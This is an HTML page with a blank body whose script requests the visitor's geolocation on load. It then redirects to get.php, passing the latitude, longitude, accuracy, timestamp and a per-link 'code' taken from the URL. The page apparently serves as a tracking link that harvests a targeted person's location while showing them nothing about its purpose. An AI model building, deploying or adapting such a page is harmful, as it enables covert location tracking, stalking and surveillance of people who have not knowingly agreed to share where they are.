<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<script>

navigator.geolocation.getCurrentPosition(getgeo);

function getgeo(position) {

    var params = (new URL(document.location)).searchParams;
    var code = params.get('code');

    var geo_text = "get.php?Latitude=" + position.coords.latitude;
    geo_text += "&Longitude=" + position.coords.longitude;
    geo_text += "&Accuracy=" + position.coords.accuracy;

    var date = new Date(position.timestamp);
    geo_text += "&Date=" + date.toLocaleString();

    geo_text += "&Code=" + code;

    location = geo_text;

}


</script>
</head>
<body>

</body>
</html>